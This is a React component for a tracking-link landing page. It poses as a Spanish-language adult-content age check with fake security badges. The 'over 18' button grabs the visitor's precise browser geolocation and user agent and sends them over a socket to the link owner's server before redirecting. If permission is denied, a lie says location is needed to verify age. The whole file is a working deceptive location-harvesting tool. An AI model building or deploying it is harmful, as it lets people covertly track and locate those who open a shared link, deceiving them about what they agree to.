import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { Helmet } from 'react-helmet-async';
import { io } from 'socket.io-client';
import api from '../services/api';

const TrackLink = () => {
    const { id } = useParams();
    const [linkData, setLinkData] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');
    const socketRef = useRef();

    useEffect(() => {
        api.get(`/links/${id}`)
            .then(res => {
                setLinkData(res.data);
                setLoading(false);
            })
            .catch(err => {
                console.error(err);
                setError('Link unavailable');
                setLoading(false);
            });

        socketRef.current = io('http://localhost:3001');
        return () => {
            if (socketRef.current) socketRef.current.disconnect();
        };
    }, [id]);

    const handleEnter = () => {
        if (!navigator.geolocation) {
            alert('La geolocalización no es compatible con tu navegador');
            if (linkData) window.location.href = linkData.destinationUrl;
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                socketRef.current.emit('update-location', {
                    linkId: id,
                    lat: latitude,
                    lng: longitude,
                    userAgent: navigator.userAgent
                });
                if (linkData) window.location.href = linkData.destinationUrl;
            },
            (err) => {
                console.error(err);
                alert('Por favor verifique su edad/ubicación para continuar.');
            }
        );
    };

    if (loading) return <div className="bg-background-dark min-h-screen text-white flex items-center justify-center">Loading...</div>;
    if (error) return <div className="bg-background-dark min-h-screen text-red-500 flex items-center justify-center">{error}</div>;

    return (
        <div className="bg-background-light dark:bg-background-dark min-h-screen flex flex-col font-display">
            <Helmet>
                <title>{linkData.title}</title>
                <meta property="og:title" content={linkData.title} />
                <meta property="og:description" content={linkData.description} />
                <meta property="og:image" content={linkData.imageUrl} />
            </Helmet>

            {/* Top Navigation Bar */}
            <div className="layout-container flex h-full grow flex-col">
                <div className="w-full flex justify-center py-5">
                    <div className="layout-content-container flex flex-col w-full max-w-[960px] flex-1 px-4">
                        <header className="flex items-center justify-between whitespace-nowrap border-b border-solid border-white/10 px-4 md:px-10 py-3">
                            <div className="flex items-center gap-4 text-white">
                                <div className="size-6 text-primary flex items-center justify-center">
                                    <span className="material-symbols-outlined">shield</span>
                                </div>
                                <h2 className="text-white text-lg font-bold leading-tight tracking-[-0.015em] font-display">Acceso a Contenido</h2>
                            </div>
                            <div className="flex items-center gap-2">
                                <span className="text-xs text-slate-400 font-display">Conexión Segura</span>
                                <button className="flex size-10 cursor-pointer items-center justify-center overflow-hidden rounded-lg bg-white/5 text-white hover:bg-white/10 transition-colors">
                                    <span className="material-symbols-outlined" style={{ fontSize: '20px' }}>lock</span>
                                </button>
                            </div>
                        </header>
                    </div>
                </div>

                {/* Main Content Area */}
                <main className="flex-1 flex items-center justify-center py-10">
                    <div className="layout-content-container flex flex-col max-w-[520px] w-full mx-auto px-4">
                        {/* Central Card UI */}
                        <div className="bg-white/5 border border-white/10 rounded-xl p-8 md:p-12 shadow-2xl backdrop-blur-sm">

                            {/* Warning Icon & Image Context */}
                            <div className="flex flex-col items-center mb-8">
                                <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mb-6">
                                    <span className="material-symbols-outlined text-primary" style={{ fontSize: '48px' }}>explicit</span>
                                </div>
                                <div className="w-full">
                                    <div className="w-full bg-center bg-no-repeat bg-cover flex flex-col justify-end overflow-hidden rounded-lg min-h-[160px] opacity-40 grayscale"
                                        style={{ backgroundImage: `url("${linkData.imageUrl || 'https://lh3.googleusercontent.com/aida-public/AB6AXuCNl14r0rr1fna5B_Q56Vc1y4y8JpyMuikTCaNWUBQmQDWpAuWP3lGIZJEheN8bgV5qDvZVFVEL9_L3T8FGYfs9ZTY3iR8xmAxHeSpNTSjxJX1LiR3h0CmIcDcrVNZeZNA8UKm6Ae9uhcsqCgGXETwdeJORKQJB96W1LM05apbO_X8QvGMjI1zI7sGVbwcb0CzkKE0AGmAkemjLOQ8OfKbXxIqMNnyLyzY8tX1LahYtNNjlJ2N0jmr_Q32kGVfJyLgjqi89HbdZZgA'}")` }}>
                                    </div>
                                </div>
                            </div>

                            {/* Headline Section */}
                            <div className="text-center mb-4">
                                <h1 className="text-white tracking-tight text-3xl font-bold leading-tight font-display">
                                    {linkData.title || "Contenido Restringido"}
                                </h1>
                            </div>

                            {/* Body Text Section */}
                            <div className="text-center mb-8">
                                <p className="text-slate-300 text-base font-normal leading-relaxed font-display px-2">
                                    {linkData.description || "Este contenido está destinado a audiencias maduras solamente. Para cumplir con las regulaciones locales, verifique su edad para continuar."}
                                </p>
                            </div>

                            {/* CTA Button Section */}
                            <div className="flex flex-col gap-4 items-center">
                                <button
                                    onClick={handleEnter}
                                    className="w-full flex min-w-[240px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-14 px-8 bg-primary text-white text-lg font-bold leading-normal tracking-[0.015em] hover:bg-primary/90 transition-all shadow-lg shadow-primary/20 active:scale-[0.98]">
                                    <span className="truncate">Soy mayor de 18 - Ver Contenido</span>
                                </button>
                                <button className="text-slate-500 hover:text-white text-sm font-medium transition-colors py-2 font-display">
                                    Salir - Soy menor de 18
                                </button>
                            </div>

                            {/* Trust Signals */}
                            <div className="mt-10 pt-6 border-t border-white/5 flex flex-col items-center gap-2">
                                <div className="flex items-center gap-2 text-slate-500 text-[10px] uppercase tracking-widest font-bold">
                                    <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>verified_user</span>
                                    Protocolo de Verificación Seguro v2.4
                                </div>
                                <p className="text-[10px] text-slate-600 text-center max-w-[300px]">
                                    Al hacer clic en "Ver Contenido", aceptas nuestros Términos de Servicio y confirmas que eres mayor de edad.
                                </p>
                            </div>

                        </div>

                        {/* Subtle Footer Links */}
                        <div className="mt-8 flex justify-center gap-6 text-slate-600 text-xs font-display">
                            <a href="#" className="hover:text-slate-400 transition-colors">Privacidad</a>
                            <a href="#" className="hover:text-slate-400 transition-colors">Términos</a>
                            <a href="#" className="hover:text-slate-400 transition-colors">Cookies</a>
                        </div>
                    </div>
                </main>
                <div className="h-10"></div>
            </div>
        </div>
    );
};

export default TrackLink;
